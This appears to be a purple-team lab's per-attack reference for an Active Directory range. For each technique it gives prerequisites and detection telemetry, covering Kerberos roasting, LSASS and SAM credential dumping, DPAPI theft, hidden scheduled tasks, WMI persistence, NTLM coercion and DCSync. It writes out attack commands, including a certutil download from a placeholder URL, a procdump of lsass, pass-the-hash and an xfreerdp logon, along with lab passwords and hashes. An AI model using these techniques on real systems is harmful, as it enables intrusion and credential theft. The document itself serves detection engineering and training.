# CAMPAIGNS-METADATA.md — Per-Attack Reference

> **Companion to** [`CAMPAIGNS.md`](CAMPAIGNS.md). One metadata block per attack.
> **Scope: 75 campaign attacks** (main spine 8 phases + 4 branches) + **14 E exercises** + **10 F supply-chain** = **99 total**. E and F are standalone exercises — not part of the campaign narrative.
> **Source:** Playbooks (`ansible/playbooks/`), walkthroughs (`01-walkthroughs/`), five-stream-merge.md, config.json.
> **Field guide:**
> - **Playbook** = `.yml` file + task line(s) that create the misconfig or vulnerability
> - **ACE#** = Specific Access Control Entry from `05-ad-attack-surface.yml`
> - **AD object** = The identity being targeted/exploited (user, group, computer, OU)
> - **Prerequisite** = What must be true for this attack to work (creds, ACLs, config)
> - **Key telemetry** = Expected ES events per detection source

---

## Main Spine — Phases 1–8

### Phase 1 — Initial Access (WT003)

| Field | Value |
|-------|-------|
| **WT#** | 003 |
| **Status** | ✅ Active |
| **Stream** | Core AD (five-stream-merge §3) |
| **Att&ck** | T1558.004 (AS-REP Roasting) |
| **Technique** | AS-REP Roasting |
| **What it does** | Sends AS-REQ to KDC for `intern_blue` who has `DONT_REQUIRE_PREAUTH`. KDC returns AS-REP encrypted with user's RC4-derived key — crackable offline. |
| **Playbook** | `05-ad-attack-surface.yml` lines 859-866 — Sets `DoesNotRequirePreAuth $true` on `intern_blue` |
| **Prerequisite** | Target user has `UF_DONT_REQUIRE_PREAUTH` (0x400000) in `userAccountControl` |
| **Target AD object** | `CN=intern_blue,OU=Detection,DC=child,DC=cadre,DC=local` (user) |
| **Source machine** | provisioning (192.168.77.60) |
| **Target machine** | dc02 (192.168.77.11) — KDC for child.cadre.local |
| **Domain joined?** | No |
| **Domain** | child.cadre.local |
| **Starting credential** | None (zero knowledge) |
| **What it earns** | `1nt3rn_Blu3!` — low-priv credential in child.cadre.local |
| **Key telemetry** | WinSec 4768 (PreAuthType:0, TargetUserName:intern_blue); Zeek kerberos.log (AS-REQ/AS-REP); Suri cadre-ad.rules SID:1000015 |

### Phase 2 — Credential Harvesting (WT002)

| Field | Value |
|-------|-------|
| **WT#** | 002 |
| **Status** | ✅ Active |
| **Stream** | Core AD (five-stream-merge §3) |
| **Att&ck** | T1558.003 (Kerberoasting) |
| **Technique** | AES Kerberoasting via ACE bridge |
| **What it does** | ACE#18 gives `intern_blue` ForceChangePassword on `analyst_t2`. Reset `analyst_t2`'s password, get TGT, then request TGS for `svc_mssql`'s SPN. |
| **Playbook** | `05-ad-attack-surface.yml` — ACE#18 lines 489-519; SPN registration line 827: `svc_mssql` → `MSSQLSvc/mbr01.child.cadre.local:1433`. |
| **ACE#** | 18 (intern_blue → analyst_t2: ForceChangePassword) |
| **Prerequisite** | `intern_blue` credential (WT003) + ACE#18 on dc02 |
| **Target AD objects** | `svc_mssql` (SPN); `analyst_t2` (ACE bridge) |
| **Source machine** | provisioning (192.168.77.60) |
| **Target machine** | dc02 (192.168.77.11) |
| **Domain joined?** | No |
| **Domain** | child.cadre.local |
| **What it earns** | `s3rv1c3_MSSQL!` — MSSQL service account, sysadmin on mbr01 |
| **Key telemetry** | WinSec 4738 (password reset), 4769 (TGS, TicketEncryptionType:0x12); Zeek kerberos.log; Suri SID:1000015 |

### Phase 3 — Execution

#### WT041 — SQL xp_cmdshell

| Field | Value |
|-------|-------|
| **WT#** | 041 |
| **Status** | ✅ Active |
| **Stream** | Core AD |
| **Att&ck** | T1059 (Command Interpreter: xp_cmdshell) |
| **What it does** | `svc_mssql` is sysadmin on mbr01 SQL. Execute OS commands via xp_cmdshell. |
| **Playbook** | `09-sql-wsus-verify.yml` — enables xp_cmdshell, mixed mode auth |
| **Prerequisite** | `svc_mssql` credential (WT002) + xp_cmdshell enabled |
| **Source machine** | provisioning → mbr01:1433 |
| **Domain** | child.cadre.local |
| **What it earns** | OS command execution as `svc_mssql` on mbr01 |
| **Key telemetry** | WinSec 4624 Type 8, 4688; Sysmon EID 1 (cmd/powershell), 3; Endpt process; Zeek smb.log; PS EID 4104 |

#### WT042 — CLR Assembly

| Field | Value |
|-------|-------|
| **WT#** | 042 |
| **Status** | ✅ Active — alternative SQL execution |
| **What it does** | Deploy malicious CLR assembly on mbr02 (CLR enabled, TRUSTWORTHY ON, strict security=0) |

#### WT043 — MSSQL Impersonation

| Field | Value |
|-------|-------|
| **WT#** | 043 |
| **Status** | ✅ Active — alternative SQL execution |
| **What it does** | `analyst_t1` has `IMPERSONATE sa` grant → sysadmin without Kerberoast |

### Branch 3.5 — Credential Theft from SYSTEM

We have SYSTEM on mbr01 via GodPotato. analyst_cloud has an active console session (auto-logon). Goal: extract domain credentials for BloodHound collection and lateral movement.

#### 3.5F — LSASS Credential Dump (T1003.001)

| Field | Value |
|-------|-------|
| **Status** | ✅ Tested — SAM dump successful, sekurlsa failed (SeDebugPrivilege) |
| **Att&ck** | T1003.001 (OS Credential Dumping: LSASS Memory) |
| **Technique** | SYSTEM + mimikatz `lsadump::sam` extracts local account hashes from SAM database |
| **What it does** | GodPotato gives SYSTEM on mbr01. mimikatz `lsadump::sam` reads the SAM registry hive to extract local account NTLM hashes. `sekurlsa::logonpasswords` failed because the GodPotato impersonated token lacks SeDebugPrivilege — LSASS memory not readable. |
| **Prerequisite** | SYSTEM on mbr01 (GodPotato via xp_cmdshell chain) |
| **Source machine** | provisioning (192.168.77.60) → mbr01 (192.168.77.22) via xp_cmdshell |
| **Target machine** | mbr01 (192.168.77.22) |
| **Domain** | child.cadre.local |
| **What it earns** | Local SAM hashes: Administrator (RID 500) NTLM `e02bc503339d51f71d913c245d35b50b`, vagrant (RID 1000) same hash, svc.elastic (RID 1001) NTLM `310673cc1e1c839f19f55d3ee7417b44` |
| **Lab security posture** | LSASS PPL: OFF (RunAsPPL deleted), VBS/Credential Guard: OFF (EnableVirtualizationBasedSecurity=0) |
| **Server 2025 reality** | On default Server 2025 with PPL ON, lsadump::sam still works (reads registry, not LSASS). sekurlsa::logonpasswords would be blocked. |
| **Key telemetry** | Sysmon EID 10 (process access on lsass.exe), Sysmon EID 1 (mimikatz process create), WinSec 4688 |
| **Tools** | GodPotato.exe, mimikatz.exe (both on mbr01 at `C:\Users\Public\`) |

#### 3.5A — Winlogon Registry (T1552.002)

| Field | Value |
|-------|-------|
| **Status** | ✅ Tested — plaintext password extracted |
| **Att&ck** | T1552.002 (Unsecured Credentials: Registry) |
| **Technique** | Auto-logon credentials stored in plaintext in Winlogon registry keys |
| **What it does** | SYSTEM reads `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` — `DefaultUserName`, `DefaultPassword`, `DefaultDomainName` contain the auto-logon credentials in plaintext. |
| **Prerequisite** | SYSTEM on mbr01 + auto-logon configured (by `06-member-services.yml`) |
| **Source machine** | provisioning → mbr01 via xp_cmdshell |
| **Target machine** | mbr01 (192.168.77.22) |
| **Domain** | child.cadre.local (but analyst_cloud is in cadre.local — cross-domain) |
| **What it earns** | `CADRE\analyst_cloud:Cl0ud_An@lyst!` — plaintext domain credential |
| **Real-world classification** | Misconfiguration discovery. Reportable finding. Common in kiosks, shared workstations, lab environments. |
| **Key telemetry** | Sysmon EID 12/13 (registry read on Winlogon keys), then 4624 Type 3/10 when credential is used |
| **Playbook anchor** | `06-member-services.yml` — sets DefaultUserName, DefaultPassword, DefaultDomainName |

#### 3.5G — Offensive DPAPI via Nemesis (T1555)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1555 (Credentials from Password Stores) |
| **Technique** | Nemesis 2.2+ automates DPAPI decryption chain — SYSTEM/user masterkeys → CNG keys → Chromium App-Bound encryption |
| **What it does** | SYSTEM on mbr01 extracts DPAPI masterkeys for analyst_cloud → Nemesis decrypts Chromium App-Bound cookies, saved RDP file credentials, Outlook cached creds, WiFi passwords. Bypasses LSASS PPL and Credential Guard (DPAPI is data-at-rest, not in-memory). |
| **Prerequisite** | SYSTEM on mbr01 + analyst_cloud has previously saved credentials (browser, RDP file, WiFi profile). Empty profile = weak demo. |
| **Source machine** | provisioning (Nemesis) → mbr01 (SYSTEM) |
| **Target machine** | mbr01 (192.168.77.22) |
| **What it earns** | Decrypted credentials from analyst_cloud profile — browser cookies, RDP saved passwords, WiFi PSKs |
| **Key telemetry** | Sysmon EID 1 (Nemesis.exe process create), EID 11 (file access to `%APPDATA%\Microsoft\Protect\`), EID 10 (LSASS-style process access not needed for DPAPI registry read) |
| **Independent of LSASS protections** | DPAPI masterkeys live in `%APPDATA%\Microsoft\Protect\<SID>\` and SYSTEM hive — NOT in LSASS process memory. PPL + Credential Guard do NOT block DPAPI access. |
| **Tool** | [github.com/SpecterOps/Nemesis](https://github.com/SpecterOps/Nemesis) |

#### 3.5H — ctfmon.exe Password Extraction

| Field | Value |
|-------|-------|
| **Status** | ✅ Tested — extraction works from SYSTEM |
| **Att&ck** | T1003 (OS Credential Dumping) |
| **Technique** | Typed passwords persist in ctfmon.exe memory after app close. Not protected by PPL. |
| **What it does** | SYSTEM dumps ctfmon.exe process memory via procdump. Typed passwords (PuTTY, WinSCP, MySQL, SSH) remain in memory minutes/hours after the application closes. ctfmon.exe is NOT a protected process — unlike LSASS with PPL. Credential Guard does NOT protect typed passwords. |
| **Prerequisite** | SYSTEM on mbr01 + analyst_cloud has typed a password into CLI tools |
| **Source machine** | provisioning → mbr01 via xp_cmdshell |
| **Target machine** | mbr01 (192.168.77.22) |
| **Limitation** | analyst_cloud must have typed a password. Auto-logon doesn't generate typed passwords. |
| **Key telemetry** | Sysmon EID 10 (process access on ctfmon.exe) |

#### 3.5I — Token Impersonation ❌

| Field | Value |
|-------|-------|
| **Status** | ❌ Failed — error 1346 (ERROR_NO_SUCH_LOGON_SESSION) |
| **Att&ck** | T1134 (Access Token Manipulation) |
| **Technique** | Steal token from analyst_cloud's running process via Win32 API |
| **What it does** | PowerShell script using OpenProcessToken → DuplicateTokenEx → ImpersonateLoggedOnUser failed. Session isolation between xp_cmdshell (session 0) and analyst_cloud (session 1). The PowerShell script was also buggy. |
| **Why it failed** | Not a Microsoft patch — session isolation. GodPotato's impersonated token also lacks SeDebugPrivilege. Correct approach would be incognito.exe or mimikatz token theft, but 3.5F (LSASS dump) is more reliable. |

#### 3.5B — Scheduled Task as analyst_cloud (Post-Credential)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1053.005 (Scheduled Task) |
| **Technique** | Create scheduled task running as analyst_cloud using known password |
| **What it does** | SYSTEM creates a scheduled task with `/ru CADRE\analyst_cloud /rp Cl0ud_An@lyst!`. Task executes SharpHound or arbitrary command as the domain user. Alternative: invisible scheduled task (Security Descriptor deletion). |
| **Prerequisite** | SYSTEM on mbr01 + analyst_cloud password from 3.5A |
| **What it earns** | SharpHound collection as analyst_cloud — full domain discovery data |
| **Key telemetry** | WinSec 4698 (task create), 4699 (task run), 4624 TargetUserName=analyst_cloud; Sysmon EID 1 |
| **Invisible variant** | Delete `HKLM\...\TaskCache\Tree\CADRE-SharpHound\Security` → task invisible to schtasks/query, Task Scheduler GUI, Autoruns |

#### 3.5C — RDP Interactive Session as analyst_cloud (T1021.001)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1021.001 (Remote Services: Remote Desktop Protocol) |
| **Technique** | Full interactive RDP logon as analyst_cloud using extracted plaintext password |
| **What it does** | From Kali, `xfreerdp /v:192.168.77.22 /u:analyst_cloud /p:'Cl0ud_An@lyst!' /d:CADRE /cert-ignore`. Cross-domain auth works via cadre.local ↔ child.cadre.local trust. Type 10 logon produces highest-fidelity SharpHound data (DCOM users, local group edges, sessions). |
| **Prerequisite** | analyst_cloud password (from 3.5A) + RDP firewall rule + `analyst_cloud` in Remote Desktop Users on mbr01 (configured by `06-member-services.yml`) |
| **Source machine** | provisioning (192.168.77.60) |
| **Target machine** | mbr01 (192.168.77.22) |
| **Domain** | cadre.local → child.cadre.local (cross-domain auth via trust) |
| **What it earns** | SharpHound session data; full SharpHound run with `-c All` (session + ACL + trust + local) |
| **Key telemetry** | WinSec 4624 Type 10 (RemoteInteractive), 4624 Type 3 (network auth for xfreerdp); Sysmon EID 3 (TCP :3389); Endpoint network; Zeek RDP.log |
| **Compared to 3.5B** | 3.5B is non-interactive schtasks; 3.5C gives true desktop session, required for SharpHound `-c Session,LoggedOn` collections |
| **Companion to 3.5D** | 3.5D = payload delivery (initial access simulation); 3.5C = real logon (use when password is already known) |

#### 3.5D — File Detonation (WT063-068)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1204.002 (User Execution: Malicious File) |
| **Technique** | SYSTEM drops payload to analyst_cloud's Downloads. Autologon session exists → user context available. |
| **What it does** | SYSTEM writes malicious file (LNK/CHM/EXE) to `C:\Users\analyst_cloud\Downloads\`. When analyst_cloud opens it, code runs in their context. Telemetry demo for initial access detection. |
| **Prerequisite** | SYSTEM on mbr01 + analyst_cloud autologon session |
| **What it earns** | Code exec as analyst_cloud (if user opens file) |
| **Key telemetry** | Sysmon EID 1 (process create), 11 (file create), 15 (file stream); Zeek http.log if download from Kali |

#### 3.5E — Logon Trigger via Startup Folder (T1547.001)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1547.001 (Boot or Logon Autostart Execution: Startup Folder) |
| **Technique** | Drop SharpHound (or any payload) into `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` — auto-runs on next interactive logon |
| **What it does** | SYSTEM copies payload to analyst_cloud's Startup folder → triggers mbr01 reboot (or waits for autologon) → analyst_cloud logon triggers Startup folder → SharpHound runs in user context. No user click required. |
| **Prerequisite** | SYSTEM on mbr01 + analyst_cloud has interactive session (auto-logon configured) + profile `C:\Users\analyst_cloud` exists (verify after first auto-logon) |
| **Source machine** | provisioning → mbr01 via xp_cmdshell |
| **Target machine** | mbr01 (192.168.77.22) |
| **What it earns** | SharpHound collection as analyst_cloud — same as 3.5B but uses startup folder instead of schtasks |
| **Key telemetry** | WinSec 4624 Type 2/11 (interactive/batch at logon), WinSec 4688 (SharpHound.exe), Sysmon EID 1 (parent = explorer.exe / logon process), Sysmon EID 11 (Startup file create) |
| **Vs 3.5B (schtasks)** | Startup folder is simpler (no task XML, no schtasks interaction) but executes on logon (not arbitrary schedule) |

#### 3.5J — WMI Event Subscriptions (T1546.003)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1546.003 (Event Triggered Execution: WMI Event Subscription) |
| **Technique** | Fileless persistence — WMI __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding |
| **What it does** | SYSTEM installs WMI event subscription that fires 60s after boot. No disk artifacts, no registry run keys, no scheduled tasks. Survives reboots. Invisible to Autoruns, Run keys, Scheduled Task scanners. |
| **Prerequisite** | SYSTEM on mbr01 |
| **What it earns** | Persistent code execution across reboots — fileless |
| **Key telemetry** | Sysmon EID 19 (WMI EventFilter), 20 (WMI EventConsumer), 21 (WMI FilterToConsumerBinding) |
| **Detection** | Only Sysmon 19/20/21 reliably captures this. Most labs don't have these enabled. |

#### 3.5K — LSASS Dump via WerFault (T1003.001)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1003.001 (OS Credential Dumping: LSASS Memory) |
| **Technique** | WerFaultSecure (Microsoft-signed) triggers Windows Error Reporting crash dump of LSASS — stealthier than procdump |
| **What it does** | SYSTEM triggers WerFault on lsass.exe → WER captures full process memory to `.dmp` → offline extraction with pypykatz/mimikatz. WerFault is signed by Microsoft so EDR often allows it without flagging. |
| **Prerequisite** | SYSTEM on mbr01 (GodPotato chain). Compare with 3.5F (procdump) to measure stealth. |
| **Source machine** | provisioning → mbr01 via xp_cmdshell |
| **Target machine** | mbr01 (192.168.77.22) |
| **What it earns** | Same as 3.5F — NTLM hashes + Kerberos tickets from LSASS memory (if sekurlsa succeeds post-WerFault) |
| **Key telemetry** | Sysmon EID 1 (WerFaultSecure.exe with LSASS as target), Sysmon EID 11 (`.dmp` file creation in `%LOCALAPPDATA%\CrashDumps\`), WinSec 4688 (WerFault child of wermgr.exe) |
| **Source** | [iPurple.team — LSASS Dump via WER (2025-11-18)](https://ipurple.team/2025/11/18/lsass-dump-windows-error-reporting/) |

#### 3.5L — LAPS Extraction (T1552.004)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1552.004 (Unsecured Credentials: Private Keys / LAPS) |
| **Technique** | Read LAPS-managed local admin passwords from `ms-Mcs-AdmPwd` attribute on computer objects in AD |
| **What it does** | Any user with `Read` permission on the LAPS attribute (e.g., via ACE#15 `analyst_t1 → OU=Operations: GenericWrite`) can LDAP-query the local admin password for any LAPS-managed machine. |
| **Prerequisite** | Authenticated domain user with LAPS Read permission (verify via BloodHound Phase 4) |
| **Source machine** | provisioning (LDAP query) |
| **Target machine** | any LAPS-managed computer (dc01, dc02, dc03, mbr01, mbr02) |
| **Domain** | any domain with LAPS deployed |
| **What it earns** | Local administrator password → local admin on every LAPS-managed machine |
| **Key telemetry** | WinSec 4662 (AD object access — `ObjectType: %{bf967aba-0de6-11d0-a285-00aa003049e2}` = computer, `AccessMask: 0x10` = Read Property), Zeek ldap.log (large-scale read of `ms-Mcs-AdmPwd`) |
| **Enhancement** | Bulk export from `ntds.dit` after Phase 6 DCSync via DSIternals `Get-ADDBAccount -LapsPasswords` (see Campaign_suggestions #87) |
| **Tool** | Native `ldapsearch` / PowerShell `Get-ADComputer` / `DSInternals` for bulk |

#### 3.5M — Azure AD Connect DPAPI Dump (T1555)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1555 (Credentials from Password Stores) |
| **Technique** | adconnectdump extracts MSOL account credentials from Cloud Sync / Azure AD Connect agent using DPAPI |
| **What it does** | CADRE has Cloud Sync agent on dc01. MSOL account credentials (used to sync on-prem AD → Entra ID) are stored using DPAPI. SYSTEM on dc01 can extract them via adconnectdump → use ROADtools to authenticate to Entra ID → enumerate cloud users/groups/apps. |
| **Prerequisite** | SYSTEM on dc01 (currently CADRE has SYSTEM on mbr01 via Phase 3 chain — pivoting to dc01 requires lateral escalation, e.g., Pass-the-Hash or DCSync) |
| **Source machine** | provisioning (ROADtools) + adconnectdump on dc01 |
| **Target machine** | dc01 (192.168.77.10) |
| **What it earns** | MSOL credentials → Entra ID access → cloud-side recon (users, groups, applications, conditional access policies) |
| **Key telemetry** | Sysmon EID 1 (adconnectdump.exe or Python adconnectdump.py), File create events on `C:\ProgramData\Microsoft\AzureAD Connect\...` or `C:\ProgramData\Microsoft\AzureAD\` (Cloud Sync), Entra ID sign-in log (MSOL from unusual IP — out of CADRE scope) |
| **Bridge to Plan 11** | This is the entry point from on-prem (Phase 3 SYSTEM) to EntraGoat (Plan 11) — on-prem compromise unlocks cloud compromise |
| **Tool** | [github.com/fox-it/adconnectdump](https://github.com/fox-it/adconnectdump) |
| **Source** | [dirkjanm.io — AAD Connect Vulnerabilities (2019)](https://dirkjanm.io/active-directory-azure-ad-connect-vulnerabilities/) |

#### 3.5N — UnCanny LPE: Non-Admin → SYSTEM via InstallService (T1068, T1574.001)

| Field | Value |
|-------|-------|
| **Status** | 🔬 Deferred — gated on Developer Mode + Samba setup (per user 2026-06-19) |
| **Att&ck** | T1068 (Exploitation for Privilege Escalation), T1574.001 (Hijack Execution Flow: DLL Side-Loading) |
| **Technique** | Loose-file AppX registration with UNC `InstalledLocation` → SYSTEM `InstallService.exe` calls `LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)` → DllMain runs as `NT AUTHORITY\SYSTEM` inside `svchost.exe` |
| **What it does** | Standard user (no admin) registers a loose-file AppX package pointing at attacker UNC share → attacker serves a real DLL via Samba (impacket returns `ERROR_INVALID_HANDLE` for loadable images) → SYSTEM loads DLL → DllMain spawns shell. **Direct SYSTEM from non-admin** — bypasses GodPotato/PrintSpoofer chain. |
| **Pre-conditions** | (1) Developer Mode enabled on target: `HKLM\...\AppModelUnlock\AllowDevelopmentWithoutDevLicense = 1`. (2) `InstallService.exe` + `AppXSvc` running (default). (3) Samba (not impacket) serving the share. |
| **Source machine** | provisioning (Kali — Samba + .NET registration via `Add-AppxPackage`) |
| **Target machine** | mbr01 (or any Win 10/11 / Server 2022/2025) |
| **Detection (cadre-e candidates)** | Sysmon EID 1: `Add-AppxPackage -Register` with UNC path in command line; Sysmon EID 3: outbound SMB from `InstallService.exe` (SYSTEM) to non-RFC1918 host; ETW `Microsoft-Windows-COM` — `CreateInstallServiceWork` COM call from non-system context |
| **Source** | [github.com/0xHossam/UnCanny](https://github.com/0xHossam/UnCanny) (0xHossam, 2026-06-19) — cloned to `docs/internal/references/sources/uncanny/UnCanny/` |
| **Pairs with WT094** | WT094 = coerce variant (machine account NTLM); 3.5N = LPE variant (non-admin → SYSTEM). Both gated on Developer Mode. |
| **Track** | Track G (Parallel Tracks — Track A triggers re-evaluation) |

#### H — Alternate Entry: File Delivery (WT063-068)

| Field | WT063 | WT064 | WT065 | WT066 | WT067 | WT068 |
|-------|-------|-------|-------|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active | ✅ Active | ✅ Active | ✅ Active | ✅ Active |
| **Stream** | Initial Access — H |
| **Technique** | Malicious LNK | MSI Installer | CHM Help | HTML Smuggling | AutoIt3 Script | Malicious EXE |
| **File type** | `.lnk` | `.msi` | `.chm` | `.html` | `.au3` | `.exe` |
| **Execution** | PowerShell | msiexec.exe | hh.exe | JS Blob → payload | AutoIt3.exe | certutil / rundll32 |
| **Playbook** | `06-member-services.yml` — RDP + Downloads for `analyst_cloud` |
| **Target user** | `analyst_cloud` (cadre.local) — RDP session on mbr01 |
| **Source** | provisioning serves files via HTTP :8080 |
| **Domain joined?** | Yes (mbr01 joined to child.cadre.local) |
| **What it earns** | Code exec as `analyst_cloud` → LSASS dump → `Cl0ud_An@lyst!` |
| **Key telemetry** | WinSec 4688; Sysmon EID 1, 11, 15; Endpt process/network; Zeek http.log |

#### G — Post-Exploit (WT090, WT083, WT082)

| Field | WT090 | WT083 | WT082 |
|-------|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active | ✅ Active |
| **Stream** | MITRE Gap — G |
| **Att&ck** | T1082 | T1105 | T1003.001 |
| **Technique** | Host Recon | Tool Transfer | LSASS Dump |
| **What it does** | `systeminfo; whoami /all; ipconfig` | `certutil -urlcache -f http://...` | `procdump -ma lsass.exe` |
| **Key telemetry** | Sysmon EID 1 (systeminfo etc) | Sysmon EID 3, 1; Zeek conn | Sysmon EID 10; Endpt API; WinSec 4663 |

### Phase 4 — Discovery (BloodHound + LDAP)

| Field | Value |
|-------|-------|
| **Status** | ✅ Active |
| **Att&ck** | T1087, T1069, T1482 |
| **Playbook** | `05-ad-attack-surface.yml` ACEs 1-26 = the surface BH discovers |
| **Prerequisite** | Authenticated AD bind (any domain credential) |
| **Source** | provisioning (remote) or mbr01 (local) |
| **Starting cred** | e.g., `svc_mssql` |
| **What it reveals** | ACE chains, delegation, ADCS templates, SCCM, linux01 link |
| **Key telemetry** | WinSec 4624 (LDAP bind), 4662 (LDAP query); Zeek ldap.log |

### Phase 5 — Lateral Movement

#### WT004 — Unconstrained Delegation + WT017 — PrinterBug

| Field | WT004 | WT017 |
|-------|-------|-------|
| **Status** | ✅ Active | ✅ Confirmed (12 fires) |
| **Stream** | Core AD | Core AD |
| **Att&ck** | T1550 | T1187 |
| **What it does** | `mbr01$` has `TrustedForDelegation`. Rubeus captures dc02$'s incoming TGT. | `coercer --spoolsample` forces dc02$ to auth to mbr01 via MS-RPRN. |
| **Playbook** | `05-ad-attack-surface.yml` — sets `TrustedForDelegation` on mbr01$ | `04-vulnerabilities.yml` — enables Print Spooler on dc02 |
| **Prerequisite** | SYSTEM on mbr01 + print spooler on dc02 | Cred to auth dc02 RPC + unconstrained delegation |
| **Starting cred** | SYSTEM (from SQL exec → priv esc) | `svc_mssql` |
| **What it earns** | `dc02$` **TGT** → full child DC credential |
| **Key telemetry** | WinSec 4662 (RPC); Zeek dce_rpc.log (opnum 1,65); Suri SID:1000050 (12 fires) |

#### WT018-020 — Non-functional Coercion Techniques

| Field | WT018 | WT019 | WT020 |
|-------|-------|-------|-------|
| **Status** | ❌ Non-functional | ❌ Non-functional | ❌ Non-functional |
| **Technique** | MS-EFSR (PetitPotam) | MS-DFSNM (DFSCoerce) | MS-FSRVP (ShadowCoerce) |
| **Reason** | `\PIPE\efsrpc` blocked on Server 2025 | SMB-pipe DCE-RPC not detectable by Suricata 8.0.5 | Service not available on Server 2025 |

#### WT021-022 — NTLM Relay

| Field | WT021 | WT022 |
|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active |
| **Technique** | NTLM Relay to LDAP (Shadow Credentials) | NTLM Relay to SMB |
| **Playbook** | `04-vulnerabilities.yml` (relay conditions) | `04-vulnerabilities.yml` — SMB signing disabled on mbr02 |
| **Key telemetry** | WinSec 4624 (relayed); Zeek ldap.log, dce_rpc.log | WinSec 4624; Zeek smb.log |

#### WT094 — UnCanny Coerce: NTLM Coercion via InstallService (T1187)

| Field | Value |
|-------|-------|
| **WT#** | 094 |
| **Status** | 🔬 Deferred — gated on Developer Mode + playbook admin change (per user 2026-06-19) |
| **Att&ck** | T1187 (Forced Authentication) |
| **Technique** | Loose-file AppX registration with UNC `InstalledLocation` → SYSTEM `InstallService.exe` calls `LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)` → outbound SMB auth from target machine account |
| **What it does** | Standard user registers a loose-file AppX package pointing at attacker UNC share → SYSTEM service loads DLL → triggers outbound SMB → attacker captures machine account NTLM on impacket-smbserver. Chain to NTLM relay (ADCS ESC8) or direct DCSync using captured hash. |
| **Pre-conditions** | (1) Developer Mode enabled on target: `HKLM\...\AppModelUnlock\AllowDevelopmentWithoutDevLicense = 1`. (2) `InstallService.exe` + `AppXSvc` running (default). (3) impacket-smbserver with patched `FileSystemName` field (XTFS → NTFS, per author's setup.sh) — AppX refuses to register on non-NTFS shares. |
| **Source machine** | provisioning (Kali — impacket-smbserver + Invoke-InstallServiceCoerce.ps1) |
| **Target machine** | mbr01 (or dc01, dc02, dc03, mbr02 — any Win 10/11 / Server 2022/2025 with Developer Mode) |
| **Domain** | any (machine account is the auth source, not a user) |
| **What it earns** | Target machine account NTLMv1/NTLMv2 — crack with hashcat -m 13100 (RC4) or -m 19700 (AES256). Chain to DCSync or NTLM relay (ESC8). |
| **Key telemetry** | Suricata SID:1000095-1000097 (cadre-coercion.rules — AppX + InstallService patterns). Sysmon EID 1: `Add-AppxPackage -Register` with UNC path. Sysmon EID 3: outbound SMB from `InstallService.exe` (SYSTEM) to non-RFC1918 host. ETW `Microsoft-Windows-COM` — `CreateInstallServiceWork` COM call. |
| **Pairs with 3.5N** | 3.5N = LPE variant (non-admin → SYSTEM via DLL load). WT094 = coerce variant (capture machine account). Both gated on Developer Mode. |
| **Source** | [github.com/0xHossam/UnCanny](https://github.com/0xHossam/UnCanny) (0xHossam, 2026-06-19) — cloned to `docs/internal/references/sources/uncanny/UnCanny/` |
| **Status rationale** | Per user 2026-06-19: "document only, defer test" — kept in campaign as documented alternative until Developer Mode decision is made. Track G (Hardened Environment Variant) is the re-evaluation trigger. |
| **Detection rules** | Already drafted in plan1.7 §14 (Suricata SID 1000095-1000097 + Elastic KQL). Ready to deploy before testing. |

#### WT005-006 — Constrained Delegation

| Field | WT005 | WT006 |
|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active |
| **Technique** | w/ Protocol Transition (S4U2Self+S4U2Proxy) | w/o Protocol Transition (S4U2Proxy only) |
| **What it does** | `mbr02$` delegates to `cifs/dc03` + `ldap/dc03` | `svc_sccm` delegates to `HTTP/mbr02.range.local` |
| **Playbook** | `05-ad-attack-surface.yml` — delegation on mbr02$ | `05-ad-attack-surface.yml` — delegation on svc_sccm |

#### WT007 — RBCD

| Field | Value |
|-------|-------|
| **WT#** | 007 |
| **Status** | ✅ Active — alternative to unconstrained delegation |
| **Technique** | Resource-Based Constrained Delegation |
| **What it does** | Create fake computer, set RBCD on target, S4U2Proxy as DA |
| **Playbook** | N/A — RBCD abuse; requires GenericWrite on target computer |

#### G — Lateral Movement (WT084-087)

| Field | WT084 | WT085 | WT086 | WT087 |
|-------|-------|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active | ✅ Active | ✅ Active |
| **Stream** | MITRE Gap — G |
| **Att&ck** | T1047 | T1021.006 | T1021.001 | T1550.002 |
| **Technique** | WMI Lateral | WinRM Lateral | RDP Restricted Admin | Pass-the-Hash |
| **What it does** | `wmic /node: target process call create` | `winrs -r:target whoami` | `mstsc /restrictedadmin` | `impacket-wmiexec -hashes` |
| **Key telemetry** | SyEID 1 (wmic.exe), 3; WE 4624/4688 | SyEID 1 (winrs.exe), 3; PS 4104 | WE 4624 Type 10 | WE 4624 Type 3 (NTLM); SyEID 3 |

### Phase 6 — Privilege Escalation: DCSync (WT009)

| Field | Value |
|-------|-------|
| **WT#** | 009 |
| **Status** | ✅ Active (confirmed — 63 fires per testing) |
| **Att&ck** | T1003.006 (DCSync via DRSUAPI) |
| **What it does** | MS-DRSR replication to extract domain secrets. Requires Replicate-Changes rights (default: DA, EA, DC). |
| **ACE#** | 13+14 (eng_agentic → DC=cadre: Get-Changes + Get-Changes-All) — alternative misconfig |
| **Prerequisite** | DA credential or DCSync rights; use Kerberos TGT or NTLM |
| **What it earns** | Child krbtgt + all user/computer hashes → **Domain Admin** child.cadre.local |
| **Key telemetry** | WinSec 4662 (DS Replication); SyEID 3; Zeek dce_rpc.log (DRSUAPI); Suri SID:1000002 (63 fires) |

### Phase 7 — Forest Trust Escalation (WT010-012)

| Field | WT010 | WT011 | WT012 |
